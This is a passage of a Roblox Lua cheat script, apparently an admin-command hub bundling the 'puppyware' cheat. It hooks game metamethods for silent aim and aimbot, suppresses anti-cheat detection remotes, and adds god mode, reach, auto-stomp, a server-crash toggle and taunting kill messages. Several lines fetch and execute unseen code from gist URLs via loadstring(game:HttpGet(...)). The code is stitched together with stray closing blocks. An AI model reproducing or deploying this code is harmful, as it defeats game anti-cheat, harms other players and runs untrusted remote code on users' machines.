					LocalPlayer.Character.RightHand:FindFirstChild("RightWrist"):Destroy()
				end
				wait(0.1)
				LocalPlayer.Character.Humanoid:ChangeState(11)
				LocalPlayer.Character.RightHand.CFrame = Module.Functions.TargetCheck(Settings.SilentAim.Nearest).Character.HumanoidRootPart.CFrame * CFrame.new(0, -1, 0)
			end
		end
	end
	if Key.KeyCode == Enum.KeyCode[Settings.Target.Bind] and not Break then
		if Settings.Target.Enabled then
			if Module.Functions.IsVisible(Module.Functions.TargetCheck(Settings.SilentAim.Nearest).Character.HumanoidRootPart, LocalPlayer.Character.HumanoidRootPart) then
				Settings.Target.TargetUser = Module.Functions.TargetCheck(Settings.SilentAim.Nearest).Name
				Notify({
					Title = Script.Name .. " " .. Script.Version,
					Description = "Targetted " .. Module.Functions.TargetCheck(Settings.SilentAim.Nearest).Name .. " (" .. Module.Functions.TargetCheck(Settings.SilentAim.Nearest).DisplayName .. ")",
					Duration = 3
				})
			end
		end
	end
end)

UserInputService.InputEnded:Connect(function(Key, Break)
	if Key.UserInputType == InputType.MouseButton2 and not Break then
		Settings.Aimbot.Aiming = false
	end
	if Key.UserInputType == InputType.MouseButton1 and not Break then
		if Module.Functions.Network(LocalPlayer) then
        --[[
            local GRightWrist = Instance.new("Motor6D", LocalPlayer.Character.RightHand)
            GRightWrist.C0 = CFrame.new(1.18422506e-07, -0.5009287, -6.81715525e-18, 1, 0, 0, 0, 1, 0, 0, 0, 1)
            GRightWrist.C1 = CFrame.new(3.55267503e-07, 0.125045404, 5.92112528e-08, 1, 0, 0, 0, 1, 0, 0, 0, 1)
            GRightWrist.CurrentAngle = 0
            GRightWrist.Name = "RightWrist"
            GRightWrist.Part0 = LocalPlayer.Character.RightLowerArm
            GRightWrist.Part1 = LocalPlayer.Character.RightHand
        ]]
			wait(0.75)
			LocalPlayer.Character.RightHand.CFrame = LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0, 1, 0)
		end
	end
end)

local __Index;
__Index = hookmetamethod(game, "__index", function(t, k)
	if t == Mouse and (tostring(k) == "Hit" or tostring(k) == "Target") then
		if Settings.Target.Enabled then
			if Settings.Target.TargetUser ~= nil then
				if Players:FindFirstChild(Settings.Target.TargetUser) ~= nil and Module.Functions.Network(Players[Settings.Target.TargetUser]) then
					if (not Settings.Target.WallCheck or Module.Functions.IsVisible(Players[Settings.Target.TargetUser].Character.HumanoidRootPart, LocalPlayer.Character.HumanoidRootPart)) then
						local TargetBody
						if Players[Settings.Target.TargetUser].Character.Humanoid:GetState() == Enum.HumanoidStateType.Freefall then
							TargetBody = Players[Settings.Target.TargetUser].Character.LeftFoot
						else
							TargetBody = Players[Settings.Target.TargetUser].Character[Settings.SilentAim.Hitbox]
						end
						local Prediction = TargetBody.CFrame + (TargetBody.Velocity * Settings.Prediction_Settings.Prediction)

						return (tostring(k) == "Hit" and Prediction or tostring(k) == "Target" and TargetBody)
					end
				end
			end
		else
			if Settings.SilentAim.Enabled then
				local NearestTarget, NearestPos = Module.Functions.TargetCheck(Settings.SilentAim.Nearest)
				if NearestTarget and (not Settings.SilentAim.VisibleCheck or Module.Functions.IsVisible(NearestTarget.Character.HumanoidRootPart, LocalPlayer.Character.HumanoidRootPart)) and (not Settings.SilentAim.FOV.Enabled or Settings.SilentAim.FOV.Size > NearestPos) then
					local TargetBody
					if NearestTarget.Character.Humanoid:GetState() == Enum.HumanoidStateType.Freefall and Settings.SilentAim.Mode == "Insane" then
						TargetBody = NearestTarget.Character.LeftFoot
					else
						TargetBody = NearestTarget.Character[Settings.SilentAim.Hitbox]
					end

					local Prediction 
					if Settings.Prediction_Settings.AutoSettings then
						Prediction = TargetBody.CFrame + (TargetBody.Velocity * Settings.Prediction_Settings.Prediction)
					else
						Prediction = TargetBody.CFrame + (TargetBody.Velocity * 0.165)
					end

					return (tostring(k) == "Hit" and Prediction or tostring(k) == "Target" and TargetBody)
				end
			end
		end
	end

	return __Index(t, k)
end)

local __Namecall;
__Namecall = hookmetamethod(game, "__namecall", function(self, ...)
	local Args = {...}
	local Method = getnamecallmethod()

	if tostring(self.Name) == "MainEvent" and tostring(Method) == "FireServer" then
		if Args[1] == "TeleportDetect" or Args[1] == "CHECKER_1" or Args[1] == "OneMoreTime" then
			return
		end
	end

	return __Namecall(self, ...)
end)

if not Module.DrawingInstance["FOV"] then
	Module.DrawingInstance["FOV"] = Module.Drawing.Circle(1)
end

if not Module.DrawingInstance["FOV2"] then
	Module.DrawingInstance["FOV2"] = Module.Drawing.Circle(1)
end

RunService.RenderStepped:Connect(function()
	if Settings.Prediction_Settings.AutoSettings then
		local PingStats = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString()
		local Value = tostring(PingStats)
		local PingValue = Value:split(" ")
		local PingNumber = tonumber(PingValue[1])

		Settings.Prediction_Settings.Prediction = PingNumber / 1000 + 0.037
	end

	if Settings.Aimbot.Enabled and Settings.Aimbot.Aiming then
		local NearestTarget, NearestPos = Module.Functions.TargetCheck(Settings.Aimbot.Nearest)
		if NearestTarget and (not Settings.Aimbot.VisibleCheck or Module.Functions.IsVisible(NearestTarget.Character.HumanoidRootPart, LocalPlayer.Character.HumanoidRootPart)) and (not Settings.Aimbot.FOV.Enabled or Settings.Aimbot.FOV.Size > NearestPos) then
			local Prediction = NearestTarget.Character[Settings.Aimbot.Hitbox].CFrame + (NearestTarget.Character[Settings.Aimbot.Hitbox].Velocity * Settings.Prediction_Settings.Prediction)
			CurrentCamera.CFrame = CFrame.lookAt(CurrentCamera.CFrame.Position, Prediction.Position)
		end
	end

	if Settings.SilentAim.FOV.Enabled then
		Module.DrawingInstance["FOV"].Visible = true
		Module.DrawingInstance["FOV"].Radius = Settings.SilentAim.FOV.Size
		Module.DrawingInstance["FOV"].Transparency = Settings.SilentAim.FOV.Transparency
		Module.DrawingInstance["FOV"].Filled = Settings.SilentAim.FOV.Filled
		if Settings.SilentAim.FOV.Shape == "Custom" then
			Module.DrawingInstance["FOV"].NumSides = Settings.SilentAim.FOV.Round
		elseif Settings.SilentAim.FOV.Shape == "Octagon" then
			Module.DrawingInstance["FOV"].NumSides = 12.5
		else 
			Module.DrawingInstance["FOV"].NumSides = 100
		end
		Module.DrawingInstance["FOV"].Color = Settings.SilentAim.FOV.Color
		Module.DrawingInstance["FOV"].Position = Vector2.new(Mouse.X, Mouse.Y + GuiInset.Y)
	else
		Module.DrawingInstance["FOV"].Visible = false
	end

	if Settings.Aimbot.FOV.Enabled then
		Module.DrawingInstance["FOV2"].Visible = true
		Module.DrawingInstance["FOV2"].Radius = Settings.Aimbot.FOV.Size
		Module.DrawingInstance["FOV2"].Transparency = Settings.Aimbot.FOV.Transparency
		Module.DrawingInstance["FOV2"].Filled = Settings.Aimbot.FOV.Filled
		if Settings.Aimbot.FOV.Shape == "Custom" then
			Module.DrawingInstance["FOV2"].NumSides = Settings.Aimbot.FOV.Round
		elseif Settings.Aimbot.FOV.Shape == "Octagon" then
			Module.DrawingInstance["FOV2"].NumSides = 12.5
		else 
			Module.DrawingInstance["FOV"].NumSides = 100
		end
		Module.DrawingInstance["FOV2"].Color = Settings.Aimbot.FOV.Color
		Module.DrawingInstance["FOV2"].Position = Vector2.new(Mouse.X, Mouse.Y + GuiInset.Y)
	else
		Module.DrawingInstance["FOV2"].Visible = false
	end

	if Module.Functions.Network(LocalPlayer) then
		local Char = LocalPlayer.Character
		local Root = Char.HumanoidRootPart
		local Hum = Char.Humanoid

		if Settings.ServerCrash.Enabled then
			Hum:ChangeState(11)
		end

		if Settings.Movement.CFrameSpeed then
			if Settings.Movement.Type == "Render" then
				if Hum.MoveDirection.Magnitude > 0 then
					Char:TranslateBy(Hum.MoveDirection)
				end
			end
		end
	end
end)

loadstring[[
game:GetService("RunService").Stepped:Connect(function() --// The broken part
    if Settings.AntiAim.UndergroundWallbang then
        for i, v in pairs(LocalPlayer.Character:GetDescendants()) do
            if v:IsA("BasePart") and v.CanCollide == true then
                v.CanCollide = false
            end
        end
    end
end)
]]

RunService.Heartbeat:Connect(function()
	if Module.Functions.Network(LocalPlayer) then
		local Char = LocalPlayer.Character
		local Root = Char.HumanoidRootPart
		local Hum = Char.Humanoid

		if Settings.Movement.CFrameSpeed then
			if Settings.Movement.Type == "Heartbeat" then
				if Hum.MoveDirection.Magnitude > 0 then
					Char:TranslateBy(Hum.MoveDirection)
				end
			end
		end

		if Settings.SilentAim.LookAt then
			local PrimaryPartOfChar = Char.PrimaryPart
			local NearestMouse, NearestPos = Module.Functions.TargetCheck(Settings.SilentAim.Nearest)
			if Module.Functions.Network(NearestMouse) then
				if (not Settings.SilentAim.VisibleCheck or Module.Functions.IsVisible(NearestMouse.Character.HumanoidRootPart, LocalPlayer.Character.HumanoidRootPart)) and (not Settings.SilentAim.FOV.Enabled or Settings.SilentAim.FOV.Size > NearestPos) then
					local NearestChar = NearestMouse.Character
					local NearestRoot = NearestChar.HumanoidRootPart
					local NearestPos = CFrame.new(PrimaryPartOfChar.Position, Vector3.new(NearestRoot.Position.X, NearestRoot.Position.Y, NearestRoot.Position.Z))
					Char:SetPrimaryPartCFrame(NearestPos)
				end
			end
		end

		if Settings.AntiAim.NoAutoRotate then
			Hum.AutoRotate = false
		else
			Hum.AutoRotate = true
		end

		if Settings.AntiAim.AntiPointAt then
			for i, v in next, Players:GetPlayers() do
				if v ~= LocalPlayer and Module.Functions.Network(v) and Module.Functions.Network(LocalPlayer) then
					local BodyEffects = v.Character:FindFirstChild("BodyEffects")
					local MousePos = BodyEffects:FindFirstChild("MousePos")
					if BodyEffects ~= nil and MousePos ~= nil then
						local EnemyMouseMagnitude = (LocalPlayer.Character.HumanoidRootPart.Position - MousePos.Value).Magnitude
						if Settings.AntiAim.AntiPointAtDistance > EnemyMouseMagnitude then
							Root.CFrame = Root.CFrame * CFrame.new(math.random(1, 2) == 1 and 2 or -2, 0, 0)
						end
					end
				end
			end
		end

		if Settings.AntiAim.UndergroundWallbang then
			Hum:ChangeState(11)
		end

		if Settings.AntiAim.Enabled then
			if Settings.AntiAim.Type == "Jitter" then
				Module.Functions.Jitter(Settings.AntiAim.Speed, Settings.AntiAim.Angle)
			else
				Module.Functions.Spin(Settings.AntiAim.Speed)
			end
		end
	end
end)

Settings.God.GodBullet = true
Module.Functions.NilBody()














end)



AddCommand("crashgui", {}, "fixes fling cmd", {}, function(Caller)
        Notify({ 
Description = "recomended that u using 'killscript' cmd";
Title = "BTW";
Duration = 2;
});

ExecuteCommand("antilag", {}, LocalPlayer);
wait(0.4)
local decalsyeeted = true -- Leaving this on makes games look shitty but the fps goes up by at least 20.
local g = game
local w = g.Workspace
local l = g.Lighting
local t = w.Terrain
sethiddenproperty(l,"Technology",2)
sethiddenproperty(t,"Decoration",false)
t.WaterWaveSize = 0
t.WaterWaveSpeed = 0
t.WaterReflectance = 0
t.WaterTransparency = 0
l.GlobalShadows = 0
l.FogEnd = 9e9
l.Brightness = 0
settings().Rendering.QualityLevel = "Level01"
for i, v in pairs(w:GetDescendants()) do
    if v:IsA("BasePart") and not v:IsA("MeshPart") then
        v.Material = "Plastic"
        v.Reflectance = 0
    elseif (v:IsA("Decal") or v:IsA("Texture")) and decalsyeeted then
        v.Transparency = 1
    elseif v:IsA("ParticleEmitter") or v:IsA("Trail") then
        v.Lifetime = NumberRange.new(0)
    elseif v:IsA("Explosion") then
        v.BlastPressure = 1
        v.BlastRadius = 1
    elseif v:IsA("Fire") or v:IsA("SpotLight") or v:IsA("Smoke") or v:IsA("Sparkles") then
        v.Enabled = false
    elseif v:IsA("MeshPart") and decalsyeeted then
        v.Material = "Plastic"
        v.Reflectance = 0
        v.TextureID = 10385902758728957
    elseif v:IsA("SpecialMesh") and decalsyeeted  then
        v.TextureId=0
    elseif v:IsA("ShirtGraphic") and decalsyeeted then
        v.Graphic=0
    elseif (v:IsA("Shirt") or v:IsA("Pants")) and decalsyeeted then
        v[v.ClassName.."Template"]=0
    end
end
for i = 1,#l:GetChildren() do
    e=l:GetChildren()[i]
    if e:IsA("BlurEffect") or e:IsA("SunRaysEffect") or e:IsA("ColorCorrectionEffect") or e:IsA("BloomEffect") or e:IsA("DepthOfFieldEffect") then
        e.Enabled = false
    end
end
w.DescendantAdded:Connect(function(v)
    wait()--prevent errors and shit
   if v:IsA("BasePart") and not v:IsA("MeshPart") then
        v.Material = "Plastic"
        v.Reflectance = 0
    elseif v:IsA("Decal") or v:IsA("Texture") and decalsyeeted then
        v.Transparency = 1
    elseif v:IsA("ParticleEmitter") or v:IsA("Trail") then
        v.Lifetime = NumberRange.new(0)
    elseif v:IsA("Explosion") then
        v.BlastPressure = 1
        v.BlastRadius = 1
    elseif v:IsA("Fire") or v:IsA("SpotLight") or v:IsA("Smoke") or v:IsA("Sparkles") then
        v.Enabled = false
    elseif v:IsA("MeshPart") and decalsyeeted then
        v.Material = "Plastic"
        v.Reflectance = 0
        v.TextureID = 10385902758728957
    elseif v:IsA("SpecialMesh") and decalsyeeted then
        v.TextureId=0
    elseif v:IsA("ShirtGraphic") and decalsyeeted then
        v.ShirtGraphic=0
    elseif (v:IsA("Shirt") or v:IsA("Pants")) and decalsyeeted then
        v[v.ClassName.."Template"]=0
    end
end)



wait(0.3)


loadstring(game:HttpGet("https://gist.githubusercontent.com/cyberical9B55/7ed204647c293c619226f22b2da6cbc2/raw/7f8438a4e8c92f8532662331fe933503421d5feb/crads"))()

end)


AddCommand("chatlogs2", {"clogs2"}, "enables chatlogs", {}, function()
    local MessageClone = Clone(ChatLogs.Frame.List);

    Utils.ClearAllObjects(ChatLogs.Frame.List)
    ChatLogs.Visible = true

    local Tween = Utils.TweenAllTransToObject(ChatLogs, .25, ChatLogsTransparencyClone)

    Destroy(ChatLogs.Frame.List)
    MessageClone.Parent = ChatLogs.Frame

    for i, v in next, GetChildren(ChatLogs.Frame.List) do
        if (not IsA(v, "UIListLayout")) then
            Utils.Tween(v, "Sine", "Out", .25, {
                TextTransparency = 0
            })
        end
    end

    local ChatLogsListLayout = ChatLogs.Frame.List.UIListLayout

    CConnect(GetPropertyChangedSignal(ChatLogsListLayout, "AbsoluteContentSize"), function()
        local CanvasPosition = ChatLogs.Frame.List.CanvasPosition
        local CanvasSize = ChatLogs.Frame.List.CanvasSize
        local AbsoluteSize = ChatLogs.Frame.List.AbsoluteSize

        if (CanvasSize.Y.Offset - AbsoluteSize.Y - CanvasPosition.Y < 20) then
           wait() -- chatlogs updates absolutecontentsize before sizing frame
           ChatLogs.Frame.List.CanvasPosition = Vector2.new(0, CanvasSize.Y.Offset + 1000) --ChatLogsListLayout.AbsoluteContentSize.Y + 100)
        end
    end)

    Utils.Tween(ChatLogs.Frame.List, "Sine", "Out", .25, {
        ScrollBarImageTransparency = 0
    })
end)



AddCommand("fixfling", {"flingfix"}, "fixes fling cmd", {}, function(Caller)
flingcooldown = false
        Notify({ 
Description = "if it doesnt work, try again in 10 seconds";
Title = "fix";
Duration = 2;
});
end)

stompauto = false
AddCommand("autostomp", {}, "fixes fling cmd", {}, function(Caller)
if stompauto == false then
stompauto = true
        Notify({ 
Description = "on";
Title = "autostomp";
Duration = 2;
});
repeat
wait()
			game.ReplicatedStorage.MainEvent:FireServer("Stomp")
until stompauto == false
else
stompauto = false
        Notify({ 
Description = "off";
Title = "autostomp";
Duration = 2;
});
end
end)

AddCommand("fistreach", {"fistreachh"}, "fixes fling cmd", {}, function(Caller)
        Notify({ 
Description = "cannot toggle";
Title = "fix";
Duration = 2;
});
	repeat
                wait()
                    local success, err = pcall(function()
                    if player.Character.BodyEffects.Attacking.Value == true then
                        for i,v in pairs(game:GetService('Players'):GetChildren()) do
                            if (v.Character.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.LeftHand.Position).Magnitude <= 50 then
                                if game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool") then
                                    if game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool"):FindFirstChild('Handle') then
                                        firetouchinterest(game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Handle, v.Character.UpperTorso, 0)
                                    else
                                        firetouchinterest(game.Players.LocalPlayer.Character['RightHand'], v.Character.UpperTorso, 0)
                                        firetouchinterest(game.Players.LocalPlayer.Character['LeftHand'], v.Character.UpperTorso, 0)
                                        firetouchinterest(game.Players.LocalPlayer.Character['RightFoot'], v.Character.UpperTorso, 0)
                                        firetouchinterest(game.Players.LocalPlayer.Character['LeftFoot'], v.Character.UpperTorso, 0)
                                        firetouchinterest(game.Players.LocalPlayer.Character['RightLowerLeg'], v.Character.UpperTorso, 0)
                                        firetouchinterest(game.Players.LocalPlayer.Character['LeftLowerLeg'], v.Character.UpperTorso, 0)
                                    end
                                end
                            end
                        end
                    end
                end)
	until autodrop1 == false
end)


AddCommand("puppyware", {"pupware"}, "fixes fling cmd", {}, function(Caller)

--[[

if getgenv().PuppywareSettings == nil then

    print("Cannot find your configuration.")

    getgenv().PuppywareSettings = {
        PerformanceMode = true,
        turksense = false,
        TargetKey = "E"
    }

end

wait(0.5)

]]



getgenv().PuppywareSettings = {
    PerformanceMode = true,
    turksense = false,
    TargetKey = "Q",
    Watermark = true
}


local PuppywareSettings = getgenv().PuppywareSettings

if PuppywareSettings == nil then

getgenv().PuppywareSettings = {
    PerformanceMode = true,
    turksense = false,
    TargetKey = "E",
    Watermark = true
}

end

local Script = {
Version = "v0.0.5",
Name = "puppyware-priv"
}

local Settings = {
Prediction_Settings = {
    AutoSettings = false,
    Prediction = 0.165
},
KillSay = {
    Type = "After Dead",
    OldPlayer = "",
    Cooldown = false,
    CustomMessage = false,
    CustomMessageText = "@s is tapped!",
    Message = {
        "@s is sus.",
        "nn tapped, @s bad cheat.",
        "puppyware on top, @s is clapped.",
        "@s is rekted.",
        "puppyware>you",
        "you are just bad get puppyware",
        "u rly thought",
        "bad boy clique",
        "noob",
        "xD",
        "why are you that bad son",
        "you shall quit"
    }
},
Aimbot = {
    Enabled = false,
    Aiming = false,
    FOV = {
        Enabled = false,
        Size = 100,
        Round = 100,
        Color = Color3.fromRGB(28, 56, 139),
        Shape = "Custom",
        Filled = false,
        Transparency = 0.5
    },
    Hitbox = "Head",
    Nearest = "Mouse",
    VisibleCheck = false,
    IgnoreFOV = false,
},
SilentAim = {
    Enabled = false,
    WallCheck = false,
    FOV = {
        Enabled = false,
        Size = 100,
        Round = 100,
        Color = Color3.fromRGB(28, 56, 139),
        Shape = "Custom",
        Filled = false,
        Transparency = 0.5
    },
    Hitbox = "Head",
    Nearest = "Mouse",
    Mode = "Normal",
    VisibleCheck = false,
    IgnoreFOV = false,
    LookAt = false,
},
Triggerbot = {
    Enabled = false,
    Delay = {
        Enabled = false,
        Value = 0
    }
},
AntiAim = {
    Enabled = false,
    Type = "Jitter",
    Angle = 20,
    Speed = 100,
    Underground = false,
    AntiPointAt = false,
    NoAutoRotate = false,
    AntiPointAtDistance = 20
},
Whitelist = {
    Players = {},
    Friends = {},
    Holder = "",
    Enabled = false,
    CrewEnabled = false,
    FriendsWhitelist = false
},
Movement = {
    CFrameSpeed = false,
    Type = "Render"
},
ServerCrash = {
    Enabled = false,
    Value = 0
},
God = {
    GodBullet = false,
    GodMelee = false,
    AntiRagdoll = false,
    IsStillAlive = false
},
Target = {
    Enabled = false,
    TargetUser = nil,
    WallCheck = false,
    Bind = PuppywareSettings.TargetKey
}
}

local Service = setmetatable({}, {
__index = function(t, k)
    return game:GetService(k)
end
})

local WS = workspace
local Insert = table.insert
local Remove = table.remove
local Find = table.find
local Players = Service.Players
local LocalPlayer = Players.LocalPlayer
local CurrentCamera = WS.CurrentCamera
local WorldToViewPortPoint = CurrentCamera.WorldToViewportPoint
local Mouse = LocalPlayer:GetMouse()
local RunService = Service.RunService
local GuiInset = Service.GuiService:GetGuiInset()
local ReplicatedStorage = Service.ReplicatedStorage
local UserInputService = Service.UserInputService
local KeyCode = Enum.KeyCode
local InputType = Enum.UserInputType
local Material = Enum.Material
local UniversalAnimation = Instance.new("Animation")
local StarterGui = Service.StarterGui

local Module = {
Instance = {},
Players = {},
DrawingInstance = {},
OldCFrame,
Ignores = {
    "UpperTorso",
    "LowerTorso",
    "Head",
    "LeftHand",
    "LeftUpperArm",
    "LeftLowerArm",
    "RightHand",
    "RightUpperArm",
    "RightLowerArm"
},
BodyParts = {
    "Head",
    "Torso",
    "HumanoidRootPart",
    "Left Arm",
    "Right Arm",
    "Left Leg",
    "Right Leg"
},	
Functions = {
    Network = function(Data)
        if Data and Data.Character and Data.Character:FindFirstChild("HumanoidRootPart") ~= nil and Data.Character:FindFirstChild("Humanoid") ~= nil and Data.Character:FindFirstChild("Head") ~= nil then
            return true
        end
        return false
    end,
    Cham = function(Data, State)
        local BoxVar = nil
        local GlowVar = nil
        if State then
            for _, v in pairs(Data.Character:GetChildren()) do
                if v:IsA("BasePart") and v.Transparency ~= 1 then
                    if not v:FindFirstChild("Box") then
                        BoxVar = Instance.new("BoxHandleAdornment", v)
                        BoxVar.Name = "Box"
                        BoxVar.AlwaysOnTop = true
                        BoxVar.ZIndex = 4
                        BoxVar.Adornee = v
                        BoxVar.Color3 = Color3.fromRGB(0, 153, 153)
                        BoxVar.Transparency = 0.5
                        BoxVar.Size = v.Size + Vector3.new(0.02, 0.02, 0.02)
                    end
                end
            end
        else
            for i, v in pairs(Data.Character:GetChildren()) do
                if v:IsA("BasePart") and v.Transparency ~= 1 then
                    if v:FindFirstChild("Box") then
                        v["Box"]:Destroy()
                    end
                end
            end
            
            return BoxVar, GlowVar
        end
    end
},
Drawing = {
    Circle = function(Thickness)
        local Circle = Drawing.new("Circle")
        Circle.Transparency = 1
        Circle.Thickness = Thickness
        return Circle
    end
},
}

Module.Functions.NoSpace = function(Data)
return Data:gsub("%s+", "") or Data
end

Module.Functions.Find = function(Data)
local Target = nil

for i, v in next, Players:GetPlayers() do
    if v.Name ~= LocalPlayer.Name and v.Name:lower():match('^'.. Module.Functions.NoSpace(Data):lower()) then
        Target = v.Name
    end
end

return Target
end

Module.Functions.PlayAnimation = function(Data, SpeedData, ActionData)
if Module.Functions.Network(LocalPlayer) then
    UniversalAnimation.AnimationId = "rbxassetid://" .. tostring(Data)
    local Track = LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):LoadAnimation(UniversalAnimation)
    if ActionData then
        Track.Priority = Enum.AnimationPriority.Action
    end
    if SpeedData ~= nil then
        Track:AdjustSpeed(SpeedData)
    end
    Track:Play()
end
end

Module.Functions.StopAnimation = function()
if Module.Functions.Network(LocalPlayer) then
    for _, v in next, LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):GetPlayingAnimationTracks() do
        if v.Animation.AnimationId:match("rbxassetid") then
            v:Stop()
        end
    end
end
end

Module.Functions.Underground = function(Data)
if Module.Functions.Network(LocalPlayer) then
    if Data then
        LocalPlayer.Character.Humanoid.HipHeight = -1
        Module.Functions.PlayAnimation(3152378852, nil, true)
    else
        LocalPlayer.Character.Humanoid.HipHeight = 2.1
        Module.Functions.StopAnimation()
    end
end
end

Module.Functions.AntiHead = function(State)
if Module.Functions.Network(LocalPlayer) then
    if State then
        Module.Functions.PlayAnimation(3189777795, 0.1, false)
    else
        Module.Functions.StopAnimation()
    end
end
end

Module.Functions.IsVisible = function(OriginPart, Part)
if Module.Functions.Network(LocalPlayer) then
    local IgnoreList = {CurrentCamera, LocalPlayer.Character, OriginPart.Parent}
    local Parts = CurrentCamera:GetPartsObscuringTarget(
        {
            OriginPart.Position, 
            Part.Position
        },
        IgnoreList
    )

    for i, v in pairs(Parts) do
        if v.Transparency >= 0.3 then
            Module.Instance[#Module.Instance + 1] = v
        end

        if v.Material == Enum.Material.Glass then
            Module.Instance[#Module.Instance + 1] = v
        end
    end

    return #Parts == 0
end
return true
end

Module.Functions.NilBody = function()
if Module.Functions.Network(LocalPlayer) then
    for i, v in pairs(LocalPlayer.Character:GetChildren()) do
        if v:IsA("BasePart") or v:IsA("Part") or v:IsA("MeshPart") then
            if v.Name ~= "HumanoidRootPart" then
                v:Destroy()
            end
        end
    end
end
end

Module.Functions.TableRemove = function(Data, Data2)
for i, v in pairs(Data) do
    if v == Data2 then
        Remove(Data, i)
    end
end
end

Module.Functions.GodFunc = function(Variable)
LocalPlayer.Character.RagdollConstraints:Destroy()
local Folder = Instance.new("Folder", LocalPlayer.Character)
Folder.Name = "FULLY_LOADED_CHAR"
wait()
StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, true)
Variable = false
end

Module.Functions.Init = function()
for _, v in next, Players:GetPlayers() do
    if v ~= LocalPlayer and v:IsFriendsWith(LocalPlayer.UserId) then
        Insert(Settings.Whitelist.Friends, v.Name)
    end
end

Players.PlayerAdded:Connect(function(_Player)
    if _Player ~= LocalPlayer and _Player:IsFriendsWith(LocalPlayer.UserId) then
        Insert(Settings.Whitelist.Friends, _Player.Name)
    end
end)

Players.PlayerRemoving:Connect(function(_Player)
    if _Player ~= LocalPlayer and _Player:IsFriendsWith(LocalPlayer.UserId) then
        Module.Functions.TableRemove(Settings.Whitelist.Friends, _Player.Name)
    end
end)

LocalPlayer.CharacterAdded:Connect(function()
    wait(0.5)
    Settings.God.IsStillAlive = false
    if LocalPlayer.Character:FindFirstChild("BodyEffects") then
        if Settings.God.GodBullet then
            Module.Functions.GodFunc(Settings.God.GodBullet)
            LocalPlayer.Character.BodyEffects.BreakingParts:Destroy()
        end
        if Settings.God.GodMelee then
            Module.Functions.GodFunc(Settings.God.GodMelee)
            Settings.God.IsStillAlive = true
            LocalPlayer.Character.BodyEffects.Armor:Destroy()
            LocalPlayer.Character.BodyEffects.Defense:Destroy()
        end
        if Settings.God.AntiRagdoll then
            Module.Functions.GodFunc(Settings.God.AntiRagdoll)
        end
    end
    wait(0.5)
    if Settings.AntiAim.Underground then
        Module.Functions.Underground(true)
    end
    wait(0.4)
    if Settings.AntiAim.UndergroundWallbang then
        Float = Instance.new("BodyVelocity")
        Float.Parent = LocalPlayer.Character.HumanoidRootPart
        Float.MaxForce = Vector3.new(100000, 100000, 100000)
        Float.Velocity = Vector3.new(0, 0, 0)
        wait(0.25)
        LocalPlayer.Character.HumanoidRootPart.CFrame = LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0, -11.5, 0)
        Module.Functions.Cham(LocalPlayer, true)
        Settings.AntiAim.UndergroundWallbang = true
    end
end)
end

Module.Functions.NearestMouse = function()
local Target = nil
local Distance = math.huge

for _, v in next, Players:GetPlayers() do
    if Module.Functions.Network(v) and v ~= LocalPlayer then
        local RootPosition, RootVisible = WorldToViewPortPoint(CurrentCamera, v.Character.HumanoidRootPart.Position)
        local NearestToMouse = (Vector2.new(Mouse.X, Mouse.Y) - Vector2.new(RootPosition.X, RootPosition.Y)).magnitude
        if RootVisible and Distance > NearestToMouse then
            if (not Settings.Whitelist.FriendsWhitelist or not Find(Settings.Whitelist.Friends, v.Name)) and (not Settings.Whitelist.CrewEnabled or v:FindFirstChild("DataFolder") and v.DataFolder.Information:FindFirstChild("Crew") and not tonumber(v.DataFolder.Information.Crew.Value) == tonumber(LocalPlayer.DataFolder.Information.Crew.Value)) and (not Settings.Whitelist.Enabled or not Find(Settings.Whitelist.Players, v.Name)) then
                Target = v
                Distance = NearestToMouse
            end
        end
    end
end

return Target, Distance
end

Module.Functions.NearestRoot = function()
local Target = nil
local Distance = math.huge

for _, v in next, Players:GetPlayers() do
    if Module.Functions.Network(v) and Module.Functions.Network(LocalPlayer) and v ~= LocalPlayer then
        local NearestToRoot = (LocalPlayer.Character.HumanoidRootPart.Position - v.Character.HumanoidRootPart.Position).magnitude
        if Distance > NearestToRoot then
            if (not Settings.Whitelist.FriendsWhitelist or not Find(Settings.Whitelist.Friends, v.Name)) and (not Settings.Whitelist.CrewEnabled or v:FindFirstChild("DataFolder") and v.DataFolder.Information:FindFirstChild("Crew") and not tonumber(v.DataFolder.Information.Crew.Value) == tonumber(LocalPlayer.DataFolder.Information.Crew.Value)) and (not Settings.Whitelist.Enabled or not Find(Settings.Whitelist.Players, v.Name)) then
                Target = v
                Distance = NearestToRoot
            end
        end
    end
end

return Target, Distance
end

Module.Functions.TargetCheck = function(Data)
if Data == "Mouse" then
    return Module.Functions.NearestMouse()
elseif Data == "Distance" then
    return Module.Functions.NearestRoot()
end
end

Module.Functions.Invisible = function()
if Module.Functions.Network(LocalPlayer) then
    Module.OldCFrame = LocalPlayer.Character.HumanoidRootPart.CFrame
    wait(0.1)
    LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0, 96995694596945934234234234, 0)
    wait(0.1)
    LocalPlayer.Character.LowerTorso.Root:Destroy()
    for _, v in pairs(LocalPlayer.Character:GetChildren()) do
        if v:IsA("MeshPart") and not table.find(Module.Ignores, v.Name) then
            v:Destroy()
        end
    end
    wait(0.1)
    LocalPlayer.Character.HumanoidRootPart.CFrame = Module.OldCFrame
end
end

Module.Functions.Jitter = function(Speed, Angle)
if Module.Functions.Network(LocalPlayer) then
    local Jit = Speed or math.random(30, 90)
    LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(LocalPlayer.Character.HumanoidRootPart.CFrame.Position) * CFrame.Angles(0, math.rad(Angle) + math.rad((math.random(1, 2) == 1 and Jit or -Jit)), 0) 
end
end

Module.Functions.Spin = function(Speed)
if Module.Functions.Network(LocalPlayer) then
    LocalPlayer.Character.HumanoidRootPart.CFrame = LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.Angles(0, math.rad(Speed), 0)
end
end

Module.Functions.HttpGet = function(Data)
return loadstring(game:HttpGet(Data))()
end

local Library = Module.Functions.HttpGet("https://gist.githubusercontent.com/cyberical9B55/dc34c86462ced900e44be30aa30bfdab/raw/fb803999e1e7a5893ec313ebe7dde0e656e46b82/lira")
